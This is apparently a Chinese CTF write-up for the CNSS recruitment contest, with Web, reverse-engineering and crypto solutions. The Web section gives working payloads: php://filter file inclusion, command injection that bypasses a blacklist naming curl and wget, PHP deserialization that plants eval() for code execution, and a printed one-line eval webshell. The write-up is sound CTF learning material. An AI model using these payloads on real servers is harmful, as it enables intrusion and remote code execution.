# CNSS招新赛游记


##  写在前面

好难，寄！

军训开始我就弃赛了，所以军训开始后才上的新题我一个都没有写。这里只有前面的几个水题wp。

其实回想了一下真的认真干过的题目就只有Re的生瓜蛋子和babyexception题，其他都是不会就摸鱼

## Web

有人专挑php的题做，我不说是谁。

### [Baby] Signin

Burpsuite新手教程？抓包修改请求头的METHOD字段，然后进行一些GET、POST和修改Cookie得到flag.

`CNSS{Y0u_kn0w_GET_and_POST}`

### [Baby]GitHacker

一个简单的git泄露板子题，使用GitExtract获得泄漏的git源码，在`index.html.d54c93`文件中看到flag。

`CNSS{Ohhhh_mY_G0d_ur3_real_G1th4ck3r}`

### [Mid]BlackPage

F12看到如下内容：

```php
&lt;?php
$file = $_GET[&#34;file&#34;];
$blacklist = &#34;(**blacklist**)&#34;;
if (preg_match(&#34;/&#34;.$blacklist.&#34;/is&#34;,$file) == 1){
  exit(&#34;Nooo,You can&#39;t read it.&#34;);
}else{
  include $file;
}
//你能读到 mybackdoor.php 吗？
&gt;
```

是一个文件包含漏洞的题，利用`php://filter`读取`mybackdoor.php`源码。

`http://121.41.7.149:65002/?file=php://filter/read=convert.base64-encode/resource=mybackdoor.php`

看到如下内容：

```php
&lt;?php
error_reporting(0);
function blacklist($cmd){
  $filter = &#34;(\\&lt;|\\&gt;|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)&#34;;
  if (preg_match(&#34;/&#34;.$filter.&#34;/is&#34;,$cmd)==1){  
      exit(&#39;Go out! This black page does not belong to you!&#39;);
  }
  else{
    system($cmd);
  }
}
blacklist($_GET[&#39;cmd&#39;]);
?&gt;
```

看到一些关键字不能用，然后可以执行system指令。

先用`ls`看看有啥文件。观察到空格被屏蔽，使用`$IFS$9`代替空格。

`http://121.41.7.149:65002/mybackdoor.php?cmd=ls$IFS$9../../../`

看到有个文件名字叫`Fl4g_is_here`

由于`cat`被屏蔽，使用`more`代替。`Fl4g`被屏蔽，使用`Fl&#39;&#39;4g`绕过。构造`payload`如下：

`http://121.41.7.149:65002/mybackdoor.php?cmd=more$IFS$9../../../Fl%27%274g_is_here`

用眼睛看，得到flag。

`CNSS{0ops!Y0u_G0t_My_Bl4ckp4ge!}`

### [Mid]太极掌门人

进行一个base64绕过使`&lt;?php exit;?&gt;`无法被识别。即：

`train=php://filter/write=convert.base64-decode/resource=tmp.php`

此时`&lt;?php exit;?&gt;`中的`&lt;?;`会被忽略，变为`phpexit`。按照base64四个一组的加密规则，在goods最前面加上一个字符即可让后面的内容被正常解密。

`goods=a(一些读取flag.php的代码的base64加密结果)`

post，然后一边写入tmp.php一边访问tmp.php即可得到flag。

`CNSS{F45ter_7han_Re5per}`

### [Mid]bestLanguage

这个题要求我们在`unserialize`时就触发`__destruct()`函数。一个简单的变量覆盖，先把`$gay`赋值成这个`class`，再赋值成别的导致这个`class`被销毁触发`__destruct()`得到flag。序列化相关知识可参考上一篇夏令营游记。

`http://42.194.177.253:10001/?p=O:9:&#34;superGate&#34;:2:{s:3:&#34;gay&#34;;O:9:&#34;superGate&#34;:2:{s:3:&#34;gay&#34;;b:1;}s:3:&#34;gay&#34;;i:123}`

用眼睛看，得到flag：

`cnss{Array_Tr1ck_is_use4}`

### [Mid]To_be_Admin_Again

这个题在`save.php`中用`php_serialize`的方法写入SESSION，在`index.php`中用`php`方式读取，造成了一些不一致。

在save.php中写入`p|(一些序列化的东西)`即可在`index.php`读取SESSION时创造一个类型为`class CNSS`的对象从而触发`__destruct()`执行`code`代码。

有一个喜闻乐见的事情是当序列化中声明的变量个数大于实际个数的时候会跳过`__wakeup()`函数。构造如下：

`http://121.41.7.149:65004/save.php?cnss=myfile|O:4:%22CNSS%22:3:{s:14:%22%00CNSS%00username%22;s:5:%22admin%22;s:10:%22%00CNSS%00code%22;s:17:%22eval($_GET[%27a%27]);%22;}`

这样我们就可以通过在`index.php`中`GET`一个`a`变量达成任意命令的执行。看看有啥文件？

`http://121.41.7.149:65004/?a=echo%20var_dump(scandir(dirname(__FILE__)));`

得到：

`array(5) { [0]=&gt; string(1) &#34;.&#34; [1]=&gt; string(2) &#34;..&#34; [2]=&gt; string(5) &#34;2.php&#34; [3]=&gt; string(9) &#34;index.php&#34; [4]=&gt; string(8) &#34;save.php&#34; }`

有个令人在意的`2.php`，看看是啥？

`http://121.41.7.149:65004/?a=echo%20show_source(%222.php%22);`

得到：

```php
&lt;?php @eval($_POST[&#39;x5tar&#39;]); ?&gt;
```

经典一句话木马。`AntSword`连接`http://121.41.7.149:65004/2.php`随便看看得到flag。

`CNSS{Admin_1s_w4tch1ng_y0u}`

## Re

### 0x01 Hello Re!

点击就送

`cnss{This_is_the_format_of_flag}`

### 0x02 Find the Key

点击就送

`cnss{IDA-is-a-useful-tool-of-reverse}`

### 0x03 有手就行

有手就行

`cnss{ACEGIKMOQSUWY}`

### 0x04 Py大师第一步

好耶，这个题是Shino的一血！

Python里自带一个命令可以生成程序的字节码的。就自己写一写观察一下不同的命令字节码大概长啥样，最后可以搞出一个字节码和`dis.txt`相差不大的程序：

```python
#笑死，我根本没保存，而且我懒得再做一遍
```

`cnss{This_is_the_dis_of_the_python}` 

### 0x05 你这 Flag 挺能藏啊

好耶，这个题是Shino的一血！

逆一下看看，核心代码是三个一组进行如下操作：

记第一个是a0,第二个是a1,第三个是a2。

```cpp
a0 ^= a1;
a2 ^= a1;
a1 ^= a0;
```

我们可以看到执行操作后的结果，记为A0,A1,A2.

```cpp
A0 = a0^a1
A1 = a1^a0^a1 = a0
A2 = a2^a1
```

得：

```CPP
a0 = A1
a1 = A0^A1
a2 = A2^A1^A0
```

重新推了一遍，可能不对，但是也可能对了，总之就是这个思路

`cnss{U_do_A_Good_Job_In_decode!!}`

### 0x06 (*&amp;C)&#43;&#43;

好耶，这个题是Shino的一血！

那我把我交的wp直接进行一个粘贴吧

#### Stage 1:

众所周知，char占1个字节，short占2个字节，long占4个字节，long long占8个字节

也就是说：

在`*(pull&#43;1)=*(pul&#43;1)=*(pus&#43;1)=*(puc&#43;1)=0x80;`中的每个`1`的类型不同，对应的指针偏移量也就不同，分别是1,2,4,8，也就将相应的位置赋值为了`0x80`

#### Stage 2:

这个时候如果分开写的话：

```c&#43;&#43;
*(pll&#43;1) = 0x80
*(pl&#43;1) = 0x80
*(ps&#43;1) = 0x80
*(pc&#43;1) = 0x80
```

输出的结果和之前是一样的。那么发生了什么事情呢？

众所周知，0x80=128，超过了char的范围，进行了一个溢出。此时char有符号，也就是说

`(pc&#43;1) = 0x80`的返回值是-128，这个值对后面产生了影响。这段代码等价于：

```c&#43;&#43;
*(pll&#43;1) = -128
*(pl&#43;1) = -128
*(ps&#43;1) = -128
*(pc&#43;1) = 0x80
```

而负数采用补码方式存储，存储结果大概是111111111111100000（1和0的个数乱打的），对应FF（全1），而修改会把指针对应大小的字节空间全部修改，这里buf的存储空间地址连续，导致将后面全部变成全1。但这仅限指针大小的空间，也就是说如果buf有0x11位，执行后buf[0x11]应该会是0吧。

#### Stage 3

`(*(unsigned long long **)&amp;puc)&#43;&#43;;`等价于`puc = (char *)puc &#43; 8;`，~~因为我用ida看了~~，因为ull是8位，强制类型转换后&#43;&#43;就把指针加上了8位到达了ubuf中值为0x80的位置

而后面执行相加操作把第一位变成了0x80



当i加到一定大小的时候会有奇怪的事情发生：ubuf并没有那么大，但ubuf与buf存储空间地址连续，推测pc指针在指向ubuf的最后一位之后指向了buf的第一位，继续执行加法导致了这样的输出。

`CNSS{1n7er3stin9_P0int3r}`

### 0x07 meta_game

好耶，这个题是Shino的一血！

Patch program入门题

把前面那些没用的函数都暴力删掉，留下最后一个能输出flag的函数。发现有1%的概率运行即可得到flag。

那不如放弃思考！反正我运行了20几次就有flag了

`cnss{0f3b82c6c7f1808e3e464ebe338c71e0}`

### 0x08 encoder

好耶，这个题是Shino的一血！

逆！

看到有个数组内容是&#34;ABCD......abcd....01234.....&#43;=/&#34;，盲猜base64.

但是没解出来。下断点动态调试看一眼发现表被改了。把密文替换成对应位置的原表字符直接base64解密就行了。

`cnss{U_ArE_g0od_at_REvErSe}`

### 0x09 CSS 大师第一步

好耶，这个题是Shino的一血！

用眼睛看，发现有一些乘法，一些加法，然后发现有一些东西我们可以设成1.

假设一个数要是1，而且他等于一些变量相乘，那么那些变量都得是1

假设一个数要是1，而且他等于一些变量相加，那么那些变量中有且仅有一个是1

写个程序把css代码读入进来，并且把形如&#34;一些数中有且仅有一个是1&#34;的约束条件输出，发现其实很好手算，手算得到答案。

```cpp
#include &lt;bits/stdc&#43;&#43;.h&gt;
using namespace std;
string lis[171] = {&#34;--2eead&#34;, &#34;--68b16&#34;, &#34;--bd92b&#34;, &#34;--8eb64&#34;, &#34;--fec8a&#34;, &#34;--f6579&#34;, &#34;--12447&#34;, &#34;--65353&#34;, &#34;--1bbf5&#34;, &#34;--42d17&#34;, &#34;--86526&#34;, &#34;--00c17&#34;, &#34;--d961b&#34;, &#34;--c7e32&#34;, &#34;--bcdac&#34;, &#34;--3bf8d&#34;, &#34;--7ce1b&#34;, &#34;--4d92b&#34;, &#34;--eef0f&#34;, &#34;--b488f&#34;, &#34;--33fa7&#34;, &#34;--2bbe3&#34;, &#34;--5bb71&#34;, &#34;--3384e&#34;, &#34;--5e2ce&#34;, &#34;--bdbac&#34;, &#34;--d75a1&#34;, &#34;--0624d&#34;, &#34;--1c582&#34;, &#34;--2b916&#34;, &#34;--28633&#34;, &#34;--d5cb1&#34;, &#34;--81e26&#34;, &#34;--d7225&#34;, &#34;--1d2b3&#34;, &#34;--4f67a&#34;, &#34;--084e9&#34;, &#34;--ae4af&#34;, &#34;--e9d11&#34;, &#34;--05d82&#34;, &#34;--4daa1&#34;, &#34;--54887&#34;, &#34;--fe35a&#34;, &#34;--12e13&#34;, &#34;--a8471&#34;, &#34;--ec4c9&#34;, &#34;--c9228&#34;, &#34;--d4655&#34;, &#34;--03f15&#34;, &#34;--22cba&#34;, &#34;--9c47e&#34;, &#34;--68930&#34;, &#34;--191cc&#34;, &#34;--6d330&#34;, &#34;--6b658&#34;, &#34;--0e125&#34;, &#34;--8bfeb&#34;, &#34;--62771&#34;, &#34;--c4575&#34;, &#34;--beba0&#34;, &#34;--bb2bb&#34;, &#34;--c0c00&#34;, &#34;--48322&#34;, &#34;--8cbdf&#34;, &#34;--71216&#34;, &#34;--95a2a&#34;, &#34;--6748b&#34;, &#34;--5ed01&#34;, &#34;--db963&#34;, &#34;--8ed74&#34;, &#34;--e0019&#34;, &#34;--7f4b5&#34;, &#34;--6b4a8&#34;, &#34;--3bf7a&#34;, &#34;--ad937&#34;, &#34;--96afc&#34;, &#34;--4c8b7&#34;, &#34;--d660c&#34;, &#34;--f5e87&#34;, &#34;--63e08&#34;, &#34;--afd50&#34;, &#34;--b9e3e&#34;, &#34;--e1d99&#34;, &#34;--161ea&#34;, &#34;--bc078&#34;, &#34;--dfc3b&#34;, &#34;--45812&#34;, &#34;--75c62&#34;, &#34;--0cd13&#34;, &#34;--60d47&#34;, &#34;--6b99d&#34;, &#34;--acbb8&#34;, &#34;--9f815&#34;, &#34;--46fd1&#34;, &#34;--ff63e&#34;, &#34;--e8a89&#34;, &#34;--98720&#34;, &#34;--0fe50&#34;, &#34;--4ad76&#34;, &#34;--81a61&#34;, &#34;--f3ea9&#34;, &#34;--49059&#34;, &#34;--14e69&#34;, &#34;--f0ffe&#34;, &#34;--7bb49&#34;, &#34;--29580&#34;, &#34;--99e12&#34;, &#34;--ec297&#34;, &#34;--00241&#34;, &#34;--6c431&#34;, &#34;--78082&#34;, &#34;--3b5b5&#34;, &#34;--6b426&#34;, &#34;--2d350&#34;, &#34;--90d05&#34;, &#34;--70006&#34;, &#34;--2fd1b&#34;, &#34;--9823e&#34;, &#34;--e68b7&#34;, &#34;--d0d96&#34;, &#34;--14b57&#34;, &#34;--ebd5f&#34;, &#34;--a4f2b&#34;, &#34;--097e7&#34;, &#34;--d4401&#34;, &#34;--e9c7d&#34;, &#34;--1e967&#34;, &#34;--286e7&#34;, &#34;--1290c&#34;, &#34;--7f952&#34;, &#34;--d6061&#34;, &#34;--2607e&#34;, &#34;--25631&#34;, &#34;--df315&#34;, &#34;--111ff&#34;, &#34;--dd697&#34;, &#34;--f6822&#34;, &#34;--9b112&#34;, &#34;--f1471&#34;, &#34;--ff9fc&#34;, &#34;--714de&#34;, &#34;--b28be&#34;, &#34;--33348&#34;, &#34;--9ee6e&#34;, &#34;--f81ec&#34;, &#34;--a8c08&#34;, &#34;--0eb94&#34;, &#34;--7cf78&#34;, &#34;--3366b&#34;, &#34;--a43bf&#34;, &#34;--7a377&#34;, &#34;--28b62&#34;, &#34;--69fe1&#34;, &#34;--ee762&#34;, &#34;--cb980&#34;, &#34;--091c0&#34;, &#34;--bad61&#34;, &#34;--428f4&#34;, &#34;--ddee7&#34;, &#34;--642a2&#34;, &#34;--b379c&#34;, &#34;--b2a13&#34;, &#34;--62a0f&#34;, &#34;--b32a6&#34;, &#34;--5bb37&#34;, &#34;--04466&#34;, &#34;--4d61b&#34;, &#34;--91408&#34;, &#34;--40a02&#34;, &#34;--03300&#34;, &#34;--8ada7&#34;};
struct data {
	string buf[20];
	int type, tot;
};
string s1 = &#34;--dd1bd&#34;;
string s2 = &#34;--28e99&#34;;
string s3 = &#34;--5588f&#34;;
string to_be[500]; int tot2;
//type = 0: 0
//type = -1: I can change it!
//type = 1: 1
//type = 2: &#43;
//type = 3: * 
map &lt;string, int&gt; ref; int idx = 0;
map &lt;string, int&gt; ref2;
data dat[10001];
int make_1(string name) {
	int id = ref[name];
	if(dat[id].type == 0) return -1;
	if(dat[id].type == 1) return 1;
	if(dat[id].type == -1) {
		int ii = -1;
		for(int i = 0; i &lt; 171; &#43;&#43;i)
			if(lis[i] == name) {
				ii = i; break;
			}
		ii = ii / 9 * 9;
		for(int i = ii; i &lt; ii&#43;9; &#43;&#43;i) dat[ref[lis[i]]].type = 0;
		dat[id].type = 1;
		cout &lt;&lt; name &lt;&lt; endl;
		return 1;
	}
	if(dat[id].type == 3) {
		for(int i = 0; i &lt; dat[id].tot; &#43;&#43;i)
			if(make_1(dat[id].buf[i]) == -1) puts(&#34;ERROR&#34;);
	}
	if(dat[id].type == 2) {
		int flag = 0;
		for(int i = 0; i &lt; dat[id].tot; &#43;&#43;i)
			if(dat[ref[dat[id].buf[i]]].type == 1) {
				flag = 1;
				break;
			}
		if(flag == 0) {
			for(int i = 0; i &lt; dat[id].tot; &#43;&#43;i)
				if(dat[ref[dat[id].buf[i]]].type == -1) {
					to_be[&#43;&#43;tot2] = dat[id].buf[i];
					cout &lt;&lt; ref2[to_be[tot2]] / 9 &#43; 2 &lt;&lt; &#34; &#34; &lt;&lt; ref2[to_be[tot2]] % 9 &#43; 1&lt;&lt; endl;
				}
			cout &lt;&lt; &#34;========\n&#34;;
			//if(flag == 0) puts(&#34;ERROR&#34;);
		}
	}
	return 1;
}
int main() {
	freopen(&#34;read.txt&#34;, &#34;r&#34;, stdin);
	freopen(&#34;outp.txt&#34;, &#34;w&#34;, stdout);
	while(1) {
		string line, name = &#34;&#34;;
		getline(cin, line);
		if(line[0] == &#39;d&#39;) break;
		for(int i = 0; i &lt; 7; &#43;&#43;i) name &#43;= line[i];
		ref[name] = &#43;&#43;idx;
		if(line[9] == &#39;0&#39;) dat[idx].type = 0;
		if(line[9] == &#39;1&#39;) dat[idx].type = 1;
		if(line[9] == &#39;c&#39;) {
			int len = line.size();
			for(int i = 9; i &lt; len; &#43;&#43;i) {
				if(line[i] == &#39;-&#39; &amp;&amp; line[i-1] != &#39;-&#39;) {
					string tmp = &#34;&#34;;
					for(int j = i; j &lt; i&#43;7; &#43;&#43;j) tmp &#43;= line[j];
					dat[idx].buf[dat[idx].tot&#43;&#43;] = tmp;
				}
				if(line[i] == &#39;&#43;&#39;) dat[idx].type = 2;
				if(line[i] == &#39;*&#39;) dat[idx].type = 3;
			}
		}
	}
	for(int i = 0; i &lt; 171; &#43;&#43;i) {
		ref2[lis[i]] = i;
		dat[ref[lis[i]]].type = -1;
	}
	make_1(s1);
	make_1(s2);
	make_1(s3);
	puts(&#34;SUCCESS&#34;);
	for(int i = 1; i &lt;= tot2; &#43;&#43;i)
		if(dat[ref[to_be[i]]].type == -1) {
			make_1(to_be[i]);
			cout &lt;&lt; to_be[i] &lt;&lt; endl;
		}
}


```

`CNSS{8718346957215865968}`

### 0x0? 生瓜蛋子

一进来先被进行了一个下马威

![](/images/CNSR/1.png)

用眼睛去瞪，观察到call的两个sub程序好像都没有什么意思，但是有一个令人在意的call loc_401619

![](/images/CNSR/2.png)

跳转过去，发现有一些意义不明的数据

![](/images/CNSR/3.png)

推测是一段代码，按C翻译成汇编：

![](/images/CNSR/4.png)

其实这个时候我们已经可以看到代码中有一些干扰程序反编译的花指令了，但是由于这个部分可以直接用眼睛去瞪，所以我并没有进行这部分程序的修复。看到wrong和congratulations字符串，推测这只是一个负责比较的函数。我们想要看到的是核心代码。观察发现这个`call loc_401725`是一个还没看过的地方，而且这个程序大概率返回了比较结果。跳转过去看看。

![](/images/CNSR/5.png)

尝试按P键创建函数，发现失败了。在图中我们可以看到一些“花指令”：他们尝试跳转到一个编译器无法识别的地址，导致反汇编无法继续进行。我们只需要利用patch program让他们全部变成nop即可。

`iret`并不是，我圈多了。

![](/images/CNSR/6.png)

修复完大概长这个样子。但是这个地方我们nop完之后出现了一个db，可能导致后面的代码反汇编不正确。需要重新搞一遍，从db开始依次按C反汇编成代码。

![](/images/CNSR/7.png)

这样，令人费解的东西就消失了。按P创建函数，按F5反编译成C语言，整理一下变成这样：（前面是一连串的赋值）

![](/images/CNSR/8.png)

其中那几个sub程序进行了一些运算，和我没有什么关系，直接复制调用就行了。

其中`v7`是已知的，`Str2`推测是我们输入的数据。得到以下关系：

`Str2[i] ^ ((v4&#43;v5)%0xFFFF) = Str1[i] ^ v8`

则`Str2[i] = Str1[i] ^ v8 ^ ((v4&#43;v5)%0xFFFF)`

其中`v4`和`v5`都可以通过`i`计算得到。`v8`是由`Str2`的几位通过计算得来的，有些棘手。但是`v8`在255之内，直接暴力枚举，输出每个v8对应的答案。最后可以在一堆乱码中找到flag。

```c&#43;&#43;
#include &lt;bits/stdc&#43;&#43;.h&gt;
using namespace std;
int __cdecl sub_4018E6(int a1)
{
  int result; // eax

  if ( a1 )
    result = a1 * sub_4018E6(a1 - 1);
  else
    result = 2;
  return result;
}
int __cdecl sub_40190D(int a1);
int __cdecl sub_40193A(int a1)
{
  int result; // eax

  if ( a1 )
    result = sub_40190D(a1 - 1) &#43; 3;
  else
    result = 3;
  return result;
}
int __cdecl sub_40190D(int a1)
{
  int result; // eax

  if ( a1 &gt; 0 )
    result = sub_40193A(a1 - 1) &#43; a1 &#43; 1;
  else
    result = 1;
  return result;
}
//直接复制的
int a[32]
int main() {
	a[0] = -40;
  a[1] = -34;
  a[2] = -23;
  a[3] = 87;
  a[4] = 26;
  a[5] = 43;
  a[6] = 99;
  a[7] = -81;
  a[8] = -83;
  a[9] = -53;
  a[10] = -20;
  a[11] = 108;
  a[12] = -22;
  a[13] = 58;
  a[14] = 72;
  a[15] = 59;
  a[16] = 42;
  a[17] = -104;
  a[18] = 122;
  a[19] = -95;
  a[20] = 43;
  a[21] = -122;
  a[22] = -125;
  a[23] = 85;
  a[24] = -118;
  a[25] = -34;
  a[26] = 44;
  a[27] = 60;
  a[28] = 37;
  a[29] = -111;
  a[30] = -65;
  a[31] = -13;
	freopen(&#34;output.txt&#34;, &#34;w&#34;, stdout);
	int v3, v4, v5;
	for ( int i = 0; i &lt;= 31; &#43;&#43;i ) {
    	v3 = sub_4018E6(i);
		v4 = sub_40190D(i) * v3;
    	v5 = sub_40193A(i);
   		a[i] ^= ((v4&#43;v5)%0xFFFF);
	}
	for(int v8 = 0; v8 &lt;= 255; &#43;&#43;v8) {
		for(int i = 0; i &lt;= 31; &#43;&#43;i) putchar(a[i]^v8);
  			putchar(&#39;\n&#39;);
	}
}

```

![](/images/CNSR/9.png)

眼力大挑战！

`cnss{We1Come_To_ReVErze_w0rld!!}`

### 0x0A Baby Exception

打开ida用大眼瞪，可以发现代码中被插入了一些`int 3`。这是一种动态反调试技术：当程序正常运行的时候`INT3`异常将被交给进程本身执行，但在`DEBUGGER`运行的时候，这一异常将被交给`DEBUGGER`处理，导致程序本身的异常处理程序不被运行，导致运行结果不同。

`IDA`的绕过方法我不会！但是运用`ollydbg`的话仅需设置忽略`INT3`异常将异常交给进程处理即可获得正确的数据。

获得正确的data和key之后，用眼睛瞪可以发现这是一个AES加密，用网上的轮子跑一跑得到答案。

```python
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex


def add_to_16(text):
    if len(text.encode(&#39;utf-8&#39;)) % 16:
        add = 16 - (len(text.encode(&#39;utf-8&#39;)) % 16)
    else:
        add = 0
    text = text &#43; (&#39;\0&#39; * add)
    return text.encode(&#39;utf-8&#39;)

def encrypt(text):
    key = &#39;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#39;.encode(&#39;utf-8&#39;)
    mode = AES.MODE_ECB
    text = add_to_16(text)
    cryptos = AES.new(key, mode)

    cipher_text = cryptos.encrypt(text)
    return cipher_text

def decrypt(text):
    key = &#39;\x4D\x4C\x57\x4E\x46\x7C\x19\x0A\x4D\x4C\x57\x4E\x46\x7C\x7B\x67&#39;.encode(&#39;utf-8&#39;)
    mode = AES.MODE_ECB
    cryptor = AES.new(key, mode)
    plain_text = cryptor.decrypt(a2b_hex(text))
    return bytes.decode(plain_text).rstrip(&#39;\0&#39;)


if __name__ == &#39;__main__&#39;:
    e = b&#39;\x96\x7f\x37\x7c\x26\x30\x03\xeb\x61\x6d\xa3\xda\x0c\x77\x3e\x7c\xdf\x18\x5d\x4e\xd9\xbe\x0a\x5c\x02\x36\x87\x37\xb4\x2f\xb1\x9f&#39;
    e = b2a_hex(e)
    d = decrypt(e)
    print(&#34;解密:&#34;, d)
```

`cnss{s3h_v3h_b0th_ez_r1ght?__:)}`

## Crypto

### 大大超人的代码 I

题意即求：
$$
ax ≡b(mod\ n)
$$
则
$$
x≡b/a(mod n)
$$

```python
from Crypto.Util.number import long_to_bytes

a = 10499958999037877045860819145654592139531258013786800315952660437695953206118177802362538707257147839843929607571065996701775308516344320494492623326535070933404552245238889019529867495706219558537483959855018656456767601472852530792072968424254995263689863458109858200434368660199825370006622972172615283000225895986795432100524830372657448639751748649746517567275491877758341825114165092719349624453145256163927226959292249202574111889453838454722039
n = 24482146465492008075985247474612414320648047425785643838292024343856484727961531014143038475016832753633643464040872815615028679515938203288641456487330618969964445990607887042678786725649115551121279019558561466028015891949399125083811735238746137986294864917479675168130071009961552443914582290960081092498541343026165888900247802180370535720495152921978143267961988522304615862013752399728187062523671938698800778472385717512452760615330027345844283
b = 13974352443151

print(long_to_bytes(b*pow(a, n-2, n)))
```

`cnss{you yi ge ren qian lai mai gua. lue lue lue lue lue. sa ri lang, sa ri lang. ei, hua qiang, hua qiang}`

### 大大超人的代码 II

题意即求num的欧拉函数值。使用sagemath，有手就行。

```
print(euler_phi(num))
```

`cnss{7b4a23cf05fc166e2f5e6798d737cb83}`

### EZRSA

RSA，e=3.一个低加密指数攻击
$$
m^3≡c(mod\ n) 
$$

$$
m^3 = kn&#43;c
$$

枚举k，直到`kn&#43;c`开三次方根开出整数即可。

```python
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes
import libnum
e = 3
n = 17122915166265113628936084259612311876364779252333817653908064563012403283413723801149226058776045562431863561527598029708484050735340376592692944196636066937254842628374596659520832392883941088961925998112268354069528298108259950738233300271339429579172788606259082714089126140552788081701431773946954101521880287079138683872063436125499187482930254182605546821908768554127091588674102227605591868183216588952297634056187432224500652151699978753316630287127751214117068167697654397115835061787620207935678045116272234790320727737354518224845334305441037073149880267837099939565780539222758100209016162314144630920799
c = 16926458617386458077637050106018850896006879092288192701331681605474802210713231004923465605065133301881405183688853792875133217926741592214428875953305593414362683885848278980412814134018268287018200015497631362139676275057736654215717198437649465165438442373537289011460247398965575656801213891887710880496787600356785377725103473390014610976378061619695088235473509

k = 0
while 1:
    res = iroot(c&#43;k*n,e)
    if(res[1] == True):
        print(long_to_bytes(res[0]).decode())
        break
    k=k&#43;1


```

### True Random

众所周知，只要随机数种子一样，生成的随机数过程就会一样。所以我们只需要把程序反着写一遍就可以了。这是一个逆向题？

```python
import random
seeds = [6756, 949, 8167, 2246, 9307, 4748, 9651, 1460, 3867, 5744, 5815, 713, 1057, 5614, 4024, 8075, 3862, 732, 279, 5308, 7815, 2251, 5533, 6324, 6786, 8549, 4421, 6651, 7409, 4880, 6246, 1249, 192, 4099, 1704, 3678, 7520, 1378, 2642, 9154, 5690, 8621, 1717, 4992, 8903, 1608, 3214, 2565, 3146, 2521, 2070, 1047, 5784, 8682, 1057, 1091, 8655, 2957, 8591, 1284, 9162, 2974, 9395]
res = [8, 221, 50, 176, 21, 79, 19, 208, 117, 8, 51, 171, 156, 247, 101, 60, 46, 152, 162, 182, 29, 16, 102, 154, 22, 117, 65, 21, 121, 197, 170, 2, 217, 118, 201, 15, 132, 246, 21, 1, 250, 7, 45, 130, 124, 231, 200, 103, 7, 63, 86, 159, 211, 168, 82, 11, 60, 173, 209, 168, 191, 255, 101]
for i in range(len(res)):
    for j in range(i&#43;1, len(res)):
        res[j] ^= res[i]

for i in range(0, len(res)):
    random.seed(seeds[i])
    rands = []
    for j in range(0, 4):
        rands.append(random.randint(0, 255))
    print(chr(res[i] ^ rands[i%4])
```

`cnss{Trust me!This is turely random!!!!TURELY RANDOMMMMMM!!!!!}`

### 基地遭到攻击

一个`base64`加密的变种。我的程序丢了，这个题就鸽了吧。

`cnss{This_is_a_strange_switch_of_Base}`

### Smooth Criminal

题意：求一个离散对数。使用sagemath秒杀。

```
discrete_log(h, mod(g, p))
```

`cnss{You_have_got_Pohilg_Hellman!}`

### 大大超人的代码Ⅲ

求最小的x，使：
$$
a^x≡b^y(mod\ p)
$$
设p的原根为g，则可以做如下变换：
$$
xlog_ga≡ylog_gb(mod\ \phi(p))
$$
其中phi(p)=p-1。

设：
$$
a&#39;≡log_ga(mod\ \phi(p))
$$

$$
b&#39;≡log_gb(mod\ \phi(p))
$$

转化为：
$$
xa&#39;≡yb&#39;(mod\ \phi(p))
$$
则只需要找到最小的x，使：
$$
gcd(b&#39;, \phi(p))|xa&#39;
$$
可以得到：
$$
x=\frac{gcd(b&#39;,\phi(p))}{gcd(b&#39;, a&#39;, \phi(p))}
$$

```python
import gmpy2
import random
p = 941958815880242161
g = 103

def f(a, b):
    if a == 0 or b == 0:
        return 0
    S = set()
    prod = b
    while(prod not in S):
        S.add(prod)
        prod = prod * b % p

    ret = 1
    prod = a 
    while(prod not in S):
        ret = ret &#43; 1
        prod = prod * a % p
    
    return ret


def f2(a, b):
    if a == 0 or b == 0:
        return 0
    newa = discrete_log(a, mod(g, p))
    newb = discrete_log(b, mod(g, p))
    return gcd(newb, p-1)/gcd(gcd(newb, p-1), newa)

flag = 0
mask = (1 &lt;&lt; 128) - 1
k1, k2 = (12345678987654321, 98765432123456789)


for i in range(1000):
    s = &#34;&#34;
    for i in range(10):
        k1, k2 = ((k1 * k1 &#43; k2) &amp; mask, (k2 * k2 &#43; k1) &amp; mask)
        s &#43;= str(f2(k1 % p, k2 % p))
    print(int(s))
    flag ^= int(s)

print(flag)
```

虽然显示是python，但这是Sagemath代码。

### ECDLP

搜这五个字就搜到了原题，跑一遍过了，咋回事呢。

`cnss{S4G3&amp;P0h1i9}`

### 那个男人！！！

一个Shamir&#39;s Secret Sharing.

观察发现，构造了一个系数全是质数的多项式`f(x)`，每次发送`1`可以得到类似`f(num)=result`的信息，求出多项式的常数项系数即可得到答案。

众所周知，当方程个数大于未知数个数，我们就可以求出所有的未知数。由于不知道这个多项式有多少项，我们直接进行一个300次的`1`的发送得到300个方程直接跑高斯消元解（当然你也可以写多点求值），然后多跑几遍赌一赌，万一某一次生成的未知系数个数真的小于等于300就可以得到flag了。

```python
from pwn import *
from hashlib import sha256
from gmpy2 import is_prime

lib = &#34;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890&#34;
p = remote(&#34;101.32.29.195&#34;, 9999)
st = p.recv().decode()
las = st[18:34]
sha = st[39:103]
print(st)
print(las)
print(sha)
print(p.recv())

def calculate_parameter(a, prm, n):
	for i in range(n):
		p = i
		for j in range(i&#43;1, n):
			if a[j][i] &gt; a[p][i]:
				p = j
		for j in range(n&#43;1):
			tmp = a[i][j]
			a[i][j] = a[p][j]
			a[p][j] = tmp
		for j in range(n):
			if not i == j:
				tt = a[j][i] * pow(a[i][i], prm-2, prm)
				for k in range(i, n&#43;1):
					a[j][k] = (a[j][k] - a[i][k] * tt % prm &#43; prm) % prm
	res = []
	for i in range(n):
		res.append(a[i][n] * pow(a[i][i], prm-2, prm) % prm)
	return res


n = 62
flag = 0
for i1 in range(n):
	for i2 in range(n):
		for i3 in range (n):
			for i4 in range(n):
				shaa = str(sha256((lib[i1]&#43;lib[i2]&#43;lib[i3]&#43;lib[i4]&#43;las).encode()).hexdigest())
				if shaa == sha:
					print(lib[i1]&#43;lib[i2]&#43;lib[i3]&#43;lib[i4])
					flag = 1
					p.sendline((lib[i1]&#43;lib[i2]&#43;lib[i3]&#43;lib[i4]).encode())
					break
			if flag == 1:
				break
		if flag == 1:
			break
	if flag == 1:
		break

if flag == 0:
	print(&#34;Not Found!&#34;)
#=====End of Prove of Work=====
print(p.recvline())
print(p.recvline())
print(p.recvline())
